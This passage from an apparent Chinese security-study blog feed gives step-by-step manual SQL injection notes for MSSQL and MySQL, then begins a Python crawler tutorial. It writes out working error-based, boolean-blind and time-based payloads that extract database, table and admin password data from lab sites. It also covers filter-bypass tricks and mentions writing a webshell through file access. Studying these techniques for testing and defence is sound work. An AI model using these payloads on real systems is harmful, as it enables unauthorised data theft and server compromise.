</code></pre><h2 id="MSSQL报错注入"><a href="#MSSQL报错注入" class="headerlink" title="MSSQL报错注入"></a>MSSQL报错注入</h2><p>（1）构造报错注入语句的基本步骤：</p><p><img src="https://i.loli.net/2021/04/29/iPQkc8Xvyl3UVbW.png" alt="image-20210429170941757"></p><p>（2）常见报错注入方式：mssql数据库对我们输入的语句进行查询的时候，<strong>通过int数据类型转换出错,回显出我们需要的结果。</strong></p><p>（3）常见拼接方式：通过判断原始条件真，用and拼接注入语句</p><p>（4）获取数据：</p><ul><li>判断数据库版本信息</li></ul><pre><code class="sql"> and 1=(select @@version)</code></pre><ul><li>获取当前数据库用户</li></ul><pre><code class="sql">and 1=(select current_user)</code></pre><ul><li>获取数据库名信息</li></ul><pre><code class="sql">1%&#39; and 1=(select top 1 name from master..sysdatabases where name not in (select top 0 name from master..sysdatabases))  --</code></pre><ul><li>获取当前数据库名信息</li></ul><pre><code class="sql">1%&#39; and 1=(select db_name()) –- </code></pre><ul><li>获取关键数据库中的表名信息</li></ul><pre><code class="sql">1%&#39; and 1=(select top 1 name from ST_WebCourse..sysobjects where xtype=&#39;U&#39; and name not in (select top 5 name from ST_WebCourse..sysobjects where xtype=&#39;U&#39;))  -- </code></pre><ul><li>获取关键表名中的列名信息</li></ul><pre><code class="sql">1%&#39; and 1=(select top 1 name from ST_WebCourse..syscolumns where id=(select id from ST_WebCourse..sysobjects where name=&#39;ST_Admin&#39;) and name not in (select top 2 name from ST_WebCourse..syscolumns where id=(select id from ST_WebCourse..sysobjects where name=&#39;ST_Admin&#39;)))-- -- 注：此处的ST_Admin可能需要进行16进制编码处理，而且最好使用的是SQL_En的方式。可以使用小葵转换工具进行编码处理</code></pre><ul><li>获取关键表中的关键字段的值</li></ul><pre><code class="sql">1%&#39; and 1=(select top 1 pass from ST_admin where pass not in (select top 0 pass from ST_Admin))  --</code></pre><p>（5）可以使用小葵转换工具中的SQL_En方式进行编码处理，MSSQL的十六进制编码。例如对字符串‘Web_Admin’进行编码：0x5700650062005F00410064006D0069006E00。</p><p><img src="https://i.loli.net/2021/05/09/REiUDQdj58oxOqG.png" alt="image-20210509183454187"></p><h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><p>（1）基本步骤：</p><p><img src="https://i.loli.net/2021/05/09/Ur2WuMezQ6IFm5V.png" alt="image-20210509183956901"></p><p>（2）示例：</p><pre><code class="sql">http://192.168.16.181:83/artshow.aspx?id=1 and (select count(*) from master.dbo.sysdatabases)&gt;7</code></pre><p>判断原始条件真，可利用and进行拼接注入语句，如果使用or 则需要是前面的查询语句为假。例如：</p><pre><code class="sql"> http://192.168.159.110:83/artshow.aspx?id=-1 or 1=1      -- 使id的值为负数或0</code></pre><p>（3）基础的payload：</p><ul><li>获取数据库的数量：</li></ul><pre><code class="sql">http://192.168.159.110:83/artshow.aspx?id=1 and (select count(*) from master.dbo.sysdatabases)&gt;7</code></pre><ul><li>获取当前数据库名信息：</li></ul><pre><code class="sql">http://192.168.159.110:83/artshow.aspx?id=1 and substring((select db_name()),1,1)= CHAR(106)</code></pre><ul><li>获取关键数据库中的表的数量信息：</li></ul><pre><code class="sql">http://192.168.159.110:83/artshow.aspx?id=1 and (select count(*) from jiaofan.dbo.sysobjects where xtype=0x55)&gt;25</code></pre><ul><li>获取数据库中的表名信息：</li></ul><pre><code class="sql">http://192.168.159.110:83/artshow.aspx?id=1 and substring((select top 1 name from jiaofan.dbo.sysobjects where xtype=0x55 and name not in(select top 1 name from jiaofan.dbo.sysobjects where xtype=0x55)),4,1)=CHAR(97)</code></pre><ul><li>获取关键表名中列的数量信息：</li></ul><pre><code class="sql">http://192.168.159.110:83/artshow.aspx?id=1 and (select count(*) from jiaofan.dbo.syscolumns where id=(select id from jiaofan.dbo.sysobjects where name=0x73006C005F00610064006D0069006E00))&gt;4</code></pre><ul><li>获取关键字段值的长度信息：</li></ul><pre><code class="sql">http://192.168.159.110:83/artshow.aspx?id=1 and (select top 1 len(u1) from sl_admin where u1 not in (select top 0 u1 from sl_admin))&gt;5</code></pre><ul><li>获取关键表中字段值的信息：</li></ul><pre><code class="sql">http://192.168.159.110:83/artshow.aspx?id=1 and substring((select top 1 u1 from sl_admin where u1 not in (select top 0 u1 from sl_admin)),1,1)= CHAR(99)</code></pre><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>MSSQL（Microsoft SQL) = SQL server</p><p>（1）PHP连接MySQL数据库、MSSQL数据库流程一致</p><pre><code class="php">mysqli_connect mysqli_query mysqli_fetch_array;mssqli_connect mssqli_query mssqli_fetch_array;</code></pre><p>（2）注入的关键在于是否有一个数据库或者表存放了数据库名称、表名称、字段名称。</p><p>其他数据库注入：</p><ul><li>其他数据库在哪里存放了数据库名称等信息</li><li>其中的函数是否一致，若不一致</li></ul><p>（3）MSSQL的内置数据库master，存在3张表</p><ul><li><p>sysdatabases存放数据库名称，name字段存放所有数据库名</p></li><li><p>sysobjecs存放表名称，name字段存放当前数据库的所有表名（注意，该表存在于每个数据库中）</p></li><li><p>sysColumns存放字段名称，name字段存放所有字段名（注意，该表存在于每个数据库中）</p></li></ul><p>查询格式：</p><pre><code>select * from db_name.user_name.table_name  #注意要加上操作用户的名称#查询数据库名称select name from master.dbo.sysdatabases也可以默认操作源select name from master..sysdatabases</code></pre><p>mssql中没有group_concat、limit，若查询结果有多行，可用top n可以取到前n行的数据，若要查询指定行的数据：</p><pre><code class="sql">-- 先查询m行的数据，然后把该数据丢弃，向下再查询n行的数据。例如：查询第2行的数据。select top 1 usernam from users where username not in (select top 1 username from users);</code></pre><p>获取到数据库名称后，查询该数据库的所有表的名称</p><pre><code class="sql">select name from db_name..sysobjects where xtype=&#39;U&#39;</code></pre><p>获取所有字段。例如jiaofan数据库里的sl_admin表的所有字段</p><pre><code class="sql">select name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;)--查询第2行的字段值select top 1 name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;) and name not in(select top 1 name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;))</code></pre><p>简化查询，使用内置函数object_id()根据表名返回数据库表名ID。</p><pre><code class="sql">select name from jiaofan..syscolumns where id=object(&#39;sl_admin&#39;)--查询第2行的字段值select top 1 name from jiaofan..syscolumns where id=object_id(&#39;sl_admin&#39;) and name not in(select top 1 name from jiaofan..syscolumns where id=object_id(&#39;sl_admin&#39;))</code></pre><p><strong>msssql为强类型数据库，union查询的列数和类型必须相同，因此联合查询前需要判断数据类型。</strong></p><p>union all select 可以显示所有的查询结果，相当于没有执行distinct操作，没有去重。</p><p>报错注入：</p><ul><li>判断数据库基本信息：and 1=(select @@version)</li><li>获取当前数据库用户：and 1=(select current_user)</li></ul><pre><code class="sql">select * from jiaofan..users where id=1 and 1=(select db_name())%&#39; and 1=(select name from jiaofan..sysobjects where xtype=&#39;U&#39;) -- %&#39; and 1=(select top 1 name from jiaofan..sysobjects where xtype=&#39;U&#39; and name not in(select top 1 name from jiaofan..sysobjects where xtype=&#39;U&#39;)) -- </code></pre><p>时间型盲注：waitfor delay ‘3’ </p><pre><code class="sql">if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39;select 1 where 1=1 if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39;%&#39; if ((select substring(user,1,1))=&#39;d&#39;) waitfor delay &#39;0:0:3&#39;-- </code></pre><p>PS：</p><p>mysql – 一个账号可以访问所有的表</p><p>mssql –一个账号可以访问所有的表，但是访问时必须表明自己的身份</p><p>Oracle – 一个账号只能管理一个数据库</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL的手工注入</title>
      <link href="2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
      <url>2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL数据库的特性"><a href="#MySQL数据库的特性" class="headerlink" title="MySQL数据库的特性"></a>MySQL数据库的特性</h2><h3 id="MySQL内置函数"><a href="#MySQL内置函数" class="headerlink" title="MySQL内置函数"></a>MySQL内置函数</h3><h4 id="获取数据库类"><a href="#获取数据库类" class="headerlink" title="获取数据库类"></a>获取数据库类</h4><p>（1）获取数据库版本</p><ul><li>version()</li><li>@@version</li></ul><p>（2）获取数据库路径：@@datadir</p><p>（3）获取数据库名：database()</p><p>（4）获取用户名：user()</p><p>（5）组合获取</p><ul><li>concat()                    #拼接函数，例concat(0x7e,string,0x7e)，其中0x7e为波浪号的十六进制</li><li>group_concat()        #将查询的多行结果放在一行显示</li></ul><h4 id="功能类"><a href="#功能类" class="headerlink" title="功能类"></a>功能类</h4><p>（1）统计型</p><ul><li>count()            #可查询某字段有多少行记录，例count(username)</li><li>length()</li></ul><p>（2）编码转换</p><ul><li>ord()</li><li>char()</li><li>hex()</li><li>bin()</li></ul><p>（3）截断函数</p><ul><li>substr()</li><li>mid()</li><li>left()</li><li>right()</li></ul><p>（4）睡眠：sleep()</p><h3 id="MySQL内置系统表"><a href="#MySQL内置系统表" class="headerlink" title="MySQL内置系统表"></a>MySQL内置系统表</h3><p>information_schema数据库，该数据库默认的三张表schemata、tables、columns</p><p>数据表：</p><p>1.schemata  schema_name属性存放所有数据库名</p><p>2.tables     table_name 存放表名</p><p>3.columns column_name 存放列名</p><pre><code class="SQL">-- 在imformation_schema数据库中的schemata表中查询所有数据库名称select schema_name from information_schema.schemata; -- 在information_schema数据库中的tables表中查询数据库名称为dvwa的所有的表的名称select table_name from information_schema.TABLES where table_schema=&quot;dvwa&quot;; -- 在information_schema数据库中的columns表中查询数据库名称为dvwa的users表的的所有字段select column_name from information_schema.columns where table_schema=&quot;dvwa&quot; and table_name=&quot;users&quot;; -- group_concat() 获取查询的所有结果-- &quot;&lt;hr&gt;&quot; 用来优化查询的显示效果(水平线)，因为该字符会伴随查询结果显示到页面上-- &quot;&lt;hr&gt;&quot; 可用16进制来表示，表示为 0x3c68723eselect group_concat(&quot;&lt;hr&gt;&quot;,schema_name) from information_schema.schemata; </code></pre><p><img src="https://i.loli.net/2021/04/25/oTqezSNiplvhPM1.png" alt="image-20210425204513085"></p><h2 id="MySQL联合查询技巧"><a href="#MySQL联合查询技巧" class="headerlink" title="MySQL联合查询技巧"></a>MySQL联合查询技巧</h2><h3 id="获取数据的基本技巧"><a href="#获取数据的基本技巧" class="headerlink" title="获取数据的基本技巧"></a>获取数据的基本技巧</h3><p>（1）判断数据库列数：order by N，当order by N时页面报错，则判断列数为N-1</p><p>（2）判断数据回显位置：union select 1,2,3,4,…..N</p><p>（3）获取任意几行数据：</p><pre><code class="sql">select * from admin limit 5,3         -- 跳过5行数据，选取后面三行数据，即第6,7,8行select * from admin limit 3 offset 5  -- 跳过5行数据，选取后面三行数据，即第6,7,8行-- offset X是跳过X个数据，limit Y是选取Y个数据</code></pre><p>（4）“admin” 可用16进制 0x61646d696e 表示</p><h3 id="编码技巧"><a href="#编码技巧" class="headerlink" title="编码技巧"></a>编码技巧</h3><p>（1）编码绕过字符串引号被过滤情况</p><ul><li>hex编码：hackbar–&gt;Encoding–&gt;Hex Encoding–&gt;String to 00ff00ff</li><li>ASCII编码：hackbar–&gt;MySQL–&gt;MySQL CHAR()</li></ul><pre><code class="sql">?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;admin&#39;?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema=0x61646d696e?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema=CHAR(97, 100, 109, 105, 110)</code></pre><p>（2）数据库本身编码问题</p><ul><li>如执行UNION 查询时，报错：Illegal mix of collations for operation ‘UNION’。</li><li>可以用convert()进行编码转换</li></ul><pre><code class="sql">-- 如：group_concat(TABLE_NAME)group_concat(convert(TABLE_NAME using gbk))group_concat(convert(TABLE_NAME using latin1))   -- 最常用group_concat(convert(TABLE_NAME using binary))group_concat(convert(TABLE_NAME using utf-8)group_concat(convert(TABLE_NAME using utf8))-- 其中， Latin1是ISO-8859-1的别名，有些环境下写作Latin-1。ISO-8859-1编码是单字节编码，向下兼容ASCII。</code></pre><h2 id="MySQL报错注入技巧"><a href="#MySQL报错注入技巧" class="headerlink" title="MySQL报错注入技巧"></a>MySQL报错注入技巧</h2><p>（1）使用条件：HTTP返回包中含有原始数据库的报错信息。</p><p>（2）MYSQL报错注入和核心——报错函数</p><ul><li>extractvalue()</li></ul><pre><code class="sql">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></pre><ul><li>updatexml()</li></ul><pre><code class="sql">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code></pre><ul><li>exp()</li></ul><pre><code class="sql">id=1 and exp(~(select * from(select user())a))</code></pre><h2 id="MySQL盲注技巧"><a href="#MySQL盲注技巧" class="headerlink" title="MySQL盲注技巧"></a>MySQL盲注技巧</h2><p>（1）使用条件：HTTP返回包中没有执行结果的数据和报错信息。</p><p>（2）MYSQL盲注的核心——字符串截断函数、条件判断语句</p><ul><li>left(string,n)函数，取字符串的前n个字符</li></ul><pre><code class="sql">?id=1 and left(database(),1)=&quot;a&quot;     --&gt; TRUE?id=1 and left(database(),2)=&quot;ad&quot;    --&gt; TRUE?id=1 and left(database(),3)=&quot;adm&quot;   --&gt; TRUE?id=1 and left(database(),4)=&quot;admi&quot;  --&gt; TRUE?id=1 and left(database(),5)=&quot;admin&quot; --&gt; TRUE</code></pre><ul><li>substr(string,m,n)、mid()函数 ，其中substr较常用，n表示取n个字符，m表示从第几个开始取。（取字符串的第m个到第n个字符。）</li></ul><pre><code class="sql">?id=1 and substr(database(),1,1)=&quot;a&quot;    --&gt; TRUE ?id=1 and substr(database(),1,2)=&quot;ad&quot;   --&gt; TRUE ?id=1 and substr(database(),1,3)=&quot;adm&quot;  --&gt; TRUE ?id=1 and substr(database(),1,4)=&quot;admi&quot; --&gt; TRUE ?id=1 and substr(database(),1,5)=&quot;admin&quot; --&gt; TRUE-- 或者：?id=1 and substr(database(),1,1)=&quot;a&quot; --&gt; TRUE ?id=1 and substr(database(),2,1)=&quot;d&quot; --&gt; TRUE ?id=1 and substr(database(),3,1)=&quot;m&quot; --&gt; TRUE ?id=1 and substr(database(),4,1)=&quot;i&quot; --&gt; TRUE ?id=1 and substr(database(),5,1)=&quot;n&quot; --&gt; TRUE </code></pre><ul><li>regexp+’正则表达式’</li></ul><pre><code class="sql">id=1 and (select database() regexp=&#39;^a&#39;) -- ^表示匹配前面字符串的第一个字符。id=1 and (select database() regexp=&#39;^ad&#39;) -- ^表示匹配前面字符串的前两个字符。</code></pre><ul><li>like + 条件 （模糊匹配，用于替代=）</li></ul><pre><code class="sql">?id=1 and (select database() like &#39;a%&#39;) --&gt; TRUE ?id=1 and (select database() like &#39;ad%&#39;) --&gt; TRUE ?id=1 and (select database() like &#39;adm%&#39;) --&gt; TRUE ?id=1 and (select database() like &#39;admi%&#39;) --&gt; TRUE ?id=1 and (select database() like &#39;admin%&#39;) --&gt; TRUE </code></pre><ul><li>取ascii()、ord()来精确获取值（避免大小写字母无法判断的情况）</li></ul><pre><code class="sql">?id=1 and ascii(substr(database(),1,1))=97 --&gt;TRUE?id=1 and ascii(substr(database(),1,1))=64 --&gt;FALSE</code></pre><ul><li>取hex 来精确获取值（避免大小写字母无法判断的情况）</li></ul><pre><code class="sql">?id=1 and hex(substr(database(),1,1))=61 --&gt;TRUE?id=1 and hex(substr(database(),1,1))=41 --&gt;FALSE</code></pre><ul><li>在语句中添加binary （二进制）来精确获取值（避免大小写字母无法判断的情况）</li></ul><pre><code class="sql">?id=1 and (select binary database() regexp&#39;^a&#39;)  --&gt;TRUE?id=1 and (select binary database() regexp&#39;^A&#39;)  --&gt;FALSE</code></pre><ul><li>if()函数</li></ul><pre><code class="sql">?id=1 and 1=if(left(database(),1)=&#39;a&#39;,1,0)         --&gt;TRUE?id=1 and 1=if(substr(database(),1,1)=&#39;a&#39;,1,0)     --&gt;TRUE?id=1 and 1=if(ascii(left(database(),1))=&#39;97&#39;,1,0) --&gt;TRUE?id=1 and 1=if(ord(left(database(),1))=&#39;97&#39;,1,0)   --&gt;TRUE?id=1 and 1=if(database() regexp&#39;^a&#39;,1,0)          --&gt;TRUE?id=1 and if(left(database(),1)=&#39;a&#39;,sleep(3),0)    --&gt;TRUE</code></pre><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>正则表达式(regexp)的主要作用：分割、匹配、查找、替换</p><p>WAF—Web Application Firewall(Web应用防火墙)</p><p>*匹配前一个字符出现0次或者无限次</p><p>?匹配前一个字符出现1次或者0次，即要么有1次，要么没有</p><p>.*任意一个字符可以出现0次或无限次（贪婪匹配，尽可能多地匹配）</p><p>.*?仍然表示任意一个字符可以出现0次或无限次（非贪婪匹配，尽可能少地区匹配）</p><pre><code>正则表达式：.*test.* 在任意字符中匹配testtest1test2test33test4</code></pre><pre><code>.*t     匹配结果：123456test #匹配到的是最后一个t，前面的所有内容包括tes都被当做任意字符去匹配，可出现0次或无限次.*?t    匹配结果：123456t   #匹配到的是第一个t，前面的123456被当做任意字符123456test</code></pre><p>preg_match((.*?),$_GET[‘user’],$return);  //在字符串中查找匹配项，返回一个数组</p><p>preg_replace((.*?),’\\n’,$_GET[‘user’]);    //将查找到的字符串替换成\\n</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>报错注入的测试语句 ‘ “ ) —联合查询、报错</p><p>布尔型 and 1=1 and 1=2 —–布尔型盲注</p><p>时间型 and sleep(5) —-时间型盲注</p><p>步骤：</p><p>1.选择该注入点的注入方式</p><p>2.判断数据库类型</p><p>3.选择漏洞利用的目标，优先选择读写文件</p><p>4.构造SQL语句进行攻击</p><h3 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h3><h4 id="1-对某个网站进行注入，分为四个步骤"><a href="#1-对某个网站进行注入，分为四个步骤" class="headerlink" title="1.对某个网站进行注入，分为四个步骤"></a>1.对某个网站进行注入，分为四个步骤</h4><ul><li>判断闭合类型、使用的语句方法</li><li>判断数据库 —SQL语句判断（表的特征）或者根据网站环境猜测，也可以根据返回的报错信息判断。</li></ul><pre><code>不同数据库的特征：mysql information_schemasqlserver sysobjectsoracle dual</code></pre><ul><li>选择利用的操作 – 操作数据/执行命令/读写文件（通过在网站下写一句话木马来控制服务器，但前提是知道网站根目录的绝对路径）</li><li>构造SQL注入语句 – 向数据库发起查询以获取有用的信息。</li></ul><h4 id="2-MySQL手工注入的方式"><a href="#2-MySQL手工注入的方式" class="headerlink" title="2.MySQL手工注入的方式"></a>2.MySQL手工注入的方式</h4><ul><li>联合查询 使用union操作符将两个select语句拼接起来同时在数据库中进行查询，将查询结果显示在页面上。</li><li>报错注入 通过网站的报错信息，某些特殊函数会将函数内的SQL语句进行执行，若该函数出现报错，则会将查询结果返回在页面上。</li><li>布尔型盲注 通过网站不同的回显信息，判断查询语句的正确与否，可以在and后构造SQL语句向数据库发起查询，若后续的SQL语句正确，则返回正常结果，以此获取信息 例如：id=1 and 1=1 返回正常；id=1 and 1=2 返回异常；</li><li>时间型盲注 通过页面的返回时间来判断SQL语句是否正确。若正确，例如在SQL查询语句后加上sleep(5)来判断。</li></ul><h4 id="3-MySQL中如何进行对应的注入"><a href="#3-MySQL中如何进行对应的注入" class="headerlink" title="3.MySQL中如何进行对应的注入"></a>3.MySQL中如何进行对应的注入</h4><ul><li>内置数据库：information_schema</li></ul><pre><code>内置表schemata，存放数据库名内置表tables，存放表名和数据库名的对应关系内置表columns，存放了字段名和表名、数据库名的对应关系</code></pre><ul><li>联合查询</li></ul><pre><code>order by 以查询结果中的某一列进行排序。若该列不存在，则会产生报错。union select 使用union操作符将前后两个select语句放在数据库中同时查询（union操作符前后的select语句列数、字符类型需要相等）由于MySQL是弱类型数据库，故不需要字符类型相同。</code></pre><h4 id="4-联合查询的流程"><a href="#4-联合查询的流程" class="headerlink" title="4.联合查询的流程"></a>4.联合查询的流程</h4><ul><li>判断可以注入的方式以及该注入点的闭合形式</li><li>判断前一个SQL语句查询的列数（order by）</li></ul><pre><code>例如对dvwa的注入过程：单引号字符型联合查询 报错注入 盲注判断前一个查询语句查询了两列判断数据的回显位置（把前面的SQL参数置空，在后面使用union select 1,2来判断回显位置）说明union select查询的两个字段都会显示在页面上，则可以在1和2的位置构造SQL语句向数据库发起查询。将查询结果放在一行显示用group_concat()函数。编码问题convert--用来解决查询时的编码问题。该函数可以修改当前数据库的查询编码convert(colname using latin1)获取数据库名、表名和列名后查询数据,查询user和password字段的值：-1&#39; union select user,password form dvwa.users;</code></pre><ul><li>union select查询数据库、表、字段、数据的信息</li><li>union特性：前后的select语句的列数必须一致 —-需要知道网站构造的SQL语句查询了几个字段</li></ul><pre><code>1&#39; union select 1,2#         字符型1 union select 1,2           数字型</code></pre><ul><li>查询时一般让union前的SQL语句执行结果置空，转而执行union后面的select查询语句。</li></ul><pre><code>-1&#39; union select 1,2##convert(xxx using latin1) 进行编码转化,避免查询的前后两个字段编码不同。select 1,convert(table_name using latin1) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;#group_concat()函数，将查询的结果放在一行显示select 1,group_concat(convert(table_name using latin1)) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;</code></pre><h5 id="EXP-amp-PoC"><a href="#EXP-amp-PoC" class="headerlink" title="EXP &amp; PoC"></a>EXP &amp; PoC</h5><p>EXP:exploit 攻击脚本–如何利用该漏洞执行特定的效果(操作数据、控制系统)–有害的</p><pre><code>-1&#39; union select database(),group_concat(convert(schema_name using latin1)) from information_schema.schemata#;获取当前数据库名和网站数据库中的所有数据库名</code></pre><p>PoC：Proof of Concept观点证明–证明该漏洞存在 —无害的</p><pre><code>1&#39; union select 1,2#      可以发现存在的漏洞</code></pre><h4 id="5-报错注入、盲注的流程"><a href="#5-报错注入、盲注的流程" class="headerlink" title="5.报错注入、盲注的流程"></a>5.报错注入、盲注的流程</h4><ul><li>判断注入方式及闭合形式（不需要判断前一个SQL语句查询的列数。）</li><li>使用特定语法进行注入，查询数据库、表、字段、数据的信息</li></ul><pre><code>报错注入函数extractvalue(value,path)--如果在path位置构造一个SQL语句，这个语句会先将被数据库进行执行。若path位置存在错误，则extractvalue函数会产生报错，将报错信息显示在页面上。该函数存在吃字符现象，无法完全显示报错的返回结果。报错注入的重点：在path的位置构造一个子句</code></pre><ul><li>limit(m,n)从第m行开始，查询后n行的数据。</li></ul><pre><code>limit(0,1) //从第0行开始，向后查询1行。也就是只查询第1行limit(5,3) //从第5行开始，向后查询3行。也就是查询6,7,8行。</code></pre><h4 id="6-盲注"><a href="#6-盲注" class="headerlink" title="6.盲注"></a>6.盲注</h4><p>（1）核心思想：根据页面是否正常返回结果来判断后面构造的SQL语句是否正确。</p><pre><code>select * from users where user_id=&quot;1&quot; and (select database())=&quot;dvwa&quot;;</code></pre><p>（2）截断函数left()</p><pre><code>select * from users where user_id=&quot;1&quot; and (select left(database(),1))=char(97);</code></pre><p>（3）substr(string,m,n) ，该函数可返回字符串的一部分。例如，substr(string,1,1)返回从第1个到第3个字符。substr(string,2,1)表示从第2个字符开始，返回1个字符；也就是返回第2个字符</p><pre><code>爆破思想：只改变m和等号后面的字符id=1 and (select substr(database(),1,1))=&quot;a&quot;id=1 and substr(database(),2,1)=&quot;d&quot;id=1 and substr(database(),3,1)=&quot;m&quot;id=1 and substr(database(),4,1)=&quot;i&quot;id=1 and substr(database(),5,1)=&quot;n&quot;</code></pre><p>（4）regexp+‘正则表达式’</p><pre><code>id=1 and (select database() regexp=&#39;^a&#39;) //^表示匹配前面字符串的第一个字符。id=1 and (select database() regexp=&#39;^ad&#39;) //^表示匹配前面字符串的前两个字符。</code></pre><p>（5）length()</p><pre><code>1&#39; and (select length(database())&lt;10)</code></pre><p>（6）步骤：</p><ul><li>获取当前需要查询的内容的长度</li><li>根据对应的长度进行每一位字符的爆破</li></ul><p>（7）常用工具：Burp Suite。爆破时可能会存在符号编码问题(例如引号、空格无法识别），可在网页中提交时用burp抓包后发送到Intruder再标记要爆破的内容。</p><pre><code>1&#39; and (select substr(database(),1,1)=char(97))#1&#39; and (select substr(database(),2,1)=char(97))#1&#39; and (select substr(database(),3,1)=char(97))#1&#39; and (select substr(database(),4,1)=char(97))#1&#39; and (select substr(database(),1,1)=char(98))#1&#39; and (select substr(database(),2,1)=char(98))#......</code></pre><p>逗号的ASCII码为44，可用此来区分返回结果中的不同数据库名称、表名、字段名、数据。</p><p>字母a-z：97-122，MySQL对大小写不敏感</p><p>数字0-1:48-57</p><p>下划线：95</p><p><strong>时间型盲注</strong>：</p><p>if()函数。</p><pre><code>#1=1是条件，success为条件成立时的操作，failed为条件不成立的操作select if(1=1,&quot;success&quot;,&quot;failed&quot;) select if(&quot;sql语句&quot;=&quot;值&quot;,sleep(3),0)?id=1&#39; and if(left(database(),1)=&#39;a&#39;,sleep(3),0)</code></pre><h2 id="常见的过滤"><a href="#常见的过滤" class="headerlink" title="常见的过滤"></a>常见的过滤</h2><ul><li>单引号、双引号被过滤，用char()、十六进制。</li><li>substr()被过滤，用left()、mid()、regexp()、like()</li><li>extractvalue()被过滤，用updataxml()、floor()、exp()</li><li>在单引号、双引号前加了转义符，则用宽字节注入 引号前加%df</li><li>过滤了union、select、where等字符串</li></ul><pre><code>将关键字替换成了空字符，1.这时可用双写绕过，ununionion2.大小写绕过，UnioN</code></pre><ul><li>过滤空格</li></ul><pre><code>将空格替换成了空字符1./**/2.0x093.&#123;$IFS&#125; （在Linux中，代表一个空格）</code></pre><ul><li>宽字节注入、堆叠注入</li></ul><h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>order by  x 以x列进行排序</p><p>若order by 3显示正常，order by 4显示异常，则代表有3列</p><p>用order by判断列数时可借助二分法的思想快速判断。</p><pre><code>1&#39; order by 4 --+            字符型1 order by 4                 数字型</code></pre><h2 id="Windows下的命令"><a href="#Windows下的命令" class="headerlink" title="Windows下的命令"></a>Windows下的命令</h2><pre><code>netstat -ano | findstr &quot;8080&quot;   //查询8080端口是否被占用tasklist /svc | findstr 9940   //查询9940这个进程</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运用Python语言(五)-网络爬虫和自动化01</title>
      <link href="2021/04/18/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%92%8C%E8%87%AA%E5%8A%A8%E5%8C%9601/"/>
      <url>2021/04/18/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%92%8C%E8%87%AA%E5%8A%A8%E5%8C%9601/</url>
      
        <content type="html"><![CDATA[<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p>（1）Python语言提供了很多实现网络爬虫的函数库，包括<strong>urllib、urllib2、urllib3、wget、scrapy、requests等</strong>。对于爬取回来的内容，可以通过<strong>re（正则表达式）、beautifulsoup4等函数库来处理。</strong>其中最主流的两个函数库是<strong>requests和beautifulsoup4</strong>，它们都是第三方库。</p><p>（2）除了网络爬虫，requests库还能实现自动向网站提交数据。</p><p>（3）网络爬虫应用一般分为两个步骤：</p><ul><li>通过网络链接获取网页内容，使用requests函数库</li><li>对获得的网页内容进行处理，使用beautifulsoup4函数库</li></ul><p>（4）采用pip3指令安装requests库。</p><pre><code>pip3 install requests</code></pre><p>（5）采用pip3指令安装beautifulsoup4库，注意：不要安装beautifulsoup库，该库已不再维护。</p><pre><code>pip3 install beautifulsoup4</code></pre><h3 id="扩展：Robots排除协议"><a href="#扩展：Robots排除协议" class="headerlink" title="扩展：Robots排除协议"></a>扩展：Robots排除协议</h3><p>（1）该协议也被称为爬虫协议，它是网站管理者表达是否希望爬虫自动获取网络信息意愿的方法。</p><p>（2）管理者可以在网站根目录放置一个robots.txt文件，并在文件中列出哪些链接不允许爬虫爬取，一般搜索引擎的爬虫会首先捕获这个文件，并根据文件要求爬取网站内容。</p><p>（3）Robots协议重点约定不希望爬虫获取的内容，如果没有改文件则表示网站内容可以被爬虫获得，然而，<strong>Robots协议不是命令和强制手段，只是国际互联网的一种通用道德规范</strong>。绝大部分成熟的搜索引擎爬虫都会遵循这个协议。</p><h2 id="requests库的使用"><a href="#requests库的使用" class="headerlink" title="requests库的使用"></a>requests库的使用</h2><p>要点：requests库是一个用于<strong>处理HTTP请求</strong>的第三方库</p><h3 id="requests库概述"><a href="#requests库概述" class="headerlink" 